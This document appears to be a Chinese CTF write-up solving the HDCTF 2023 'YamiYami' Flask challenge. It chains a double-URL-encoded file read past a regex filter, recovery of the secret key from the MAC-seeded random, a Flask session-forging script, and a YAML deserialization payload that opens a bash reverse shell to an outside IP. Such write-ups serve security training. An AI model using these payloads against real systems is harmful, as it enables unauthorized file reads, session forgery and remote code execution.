# YamiYami

复现地址：[HDCTF 2023 YamiYami | NSSCTF (ctfer.vip)](https://www.ctfer.vip/problem/3780)

## 双重URL编码绕正则

发现一个任意文件读取接口

* 读取进程启动命令

`/read?url=file:///proc/self/cmdline`

返回`python /app/app.py`

* 尝试读取`app.py`

`/read?url=file:///app/app.py`

返回`re.findall('app.*', url, re.IGNORECASE)`

file协议是支持URL编码的（想想也是，本地文件用浏览器打开，地址栏就是file协议）

两次URL编码，flask拿到请求参数会解码一次，file协议读取时会再解码一次

`/read?url=file:///%2561%2570%2570/%2561%2570%2570.py`

```python
#encoding:utf-8
import os
import re, random, uuid
from flask import *
from werkzeug.utils import *
import yaml
from urllib.request import urlopen
app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = False
BLACK_LIST=["yaml","YAML","YML","yml","yamiyami"]
app.config['UPLOAD_FOLDER']="/app/uploads"

@app.route('/')
def index():
    session['passport'] = 'YamiYami'
    return '''
    Welcome to HDCTF2023 <a href="/read?url=https://baidu.com">Read somethings</a>
    <br>
    Here is the challenge <a href="/upload">Upload file</a>
    <br>
    Enjoy it <a href="/pwd">pwd</a>
    '''
@app.route('/pwd')
def pwd():
    return str(pwdpath)
@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('app.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m:
            return "re.findall('app.*', url, re.IGNORECASE)"
        if n:
            return "re.findall('flag', url, re.IGNORECASE)"
        res = urlopen(url)
        return res.read()
    except Exception as ex:
        print(str(ex))
    return 'no response'

def allowed_file(filename):
   for blackstr in BLACK_LIST:
       if blackstr in filename:
           return False
   return True
@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            return "Empty file"
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            if not os.path.exists('./uploads/'):
                os.makedirs('./uploads/')
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            return "upload successfully!"
    return render_template("index.html")
@app.route('/boogipop')
def load():
    if session.get("passport")=="Welcome To HDCTF2023":
        LoadedFile=request.args.get("file")
        if not os.path.exists(LoadedFile):
            return "file not exists"
        with open(LoadedFile) as f:
            yaml.full_load(f)
            f.close()
        return "van you see"
    else:
        return "No Auth bro"
if __name__=='__main__':
    pwdpath = os.popen("pwd").read()
    app.run(
        debug=False,
        host="0.0.0.0"
    )
    print(app.config['SECRET_KEY'])
```

## Session 伪造

> 在 python 中使用 uuid 模块生成 UUID（通用唯一识别码）。
>
> 使用 uuid.getnode() 方法来获取计算机的硬件地址，这个地址将作为 UUID 的一部分。

`/sys/class/net/eth0/address`为网卡位置

读取得到`02:42:ac:02:45:95` 转为十进制`2485376927125`

```python
import random

random.seed(2485376927125)
print(str(random.random()*233))

# 231.28194338656192
```

```python
import zlib
from itsdangerous import base64_decode
import ast
from abc import ABC
import json

from flask.sessions import SecureCookieSessionInterface


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


class FSCM(ABC):
    def encode(self, secret_key, session_cookie_structure):
        """ Encode a Flask session cookie """
        try:
            app = MockApp(secret_key)

            session_cookie_structure = json.loads(session_cookie_structure)
            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)

            return s.dumps(session_cookie_structure)
        except Exception as e:
            return "[Encoding error] {}".format(e)
            raise e

    def decode(self, session_cookie_value, secret_key=None):
        """ Decode a Flask cookie  """
        try:
            if (secret_key == None):
                compressed = False
                payload = session_cookie_value

                if payload.startswith('.'):
                    compressed = True
                    payload = payload[1:]

                data = payload.split(".")[0]

                data = base64_decode(data)
                if compressed:
                    data = zlib.decompress(data)

                return data
            else:
                app = MockApp(secret_key)

                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.loads(session_cookie_value)
        except Exception as e:
            return "[Decoding error] {}".format(e)
            raise e


fscm = FSCM()
decoded = fscm.decode("eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZEUgKg.Ai4qoRiy3lT9idUgH_6pQ_Ci2GA", "231.28194338656192")
print(decoded)
print(fscm.encode("231.28194338656192", '{"passport": "Welcome To HDCTF2023"}'))
```

## Yaml反序列化

```yml
!!python/object/new:str
    args: []
    state: !!python/tuple
      - "__import__('os').system('bash -c \"bash -i >& /dev/tcp/47.113.198.53/3389 <&1\"')"
      - !!python/object/new:staticmethod
        args: []
        state:
          update: !!python/name:eval
          items: !!python/name:list
```

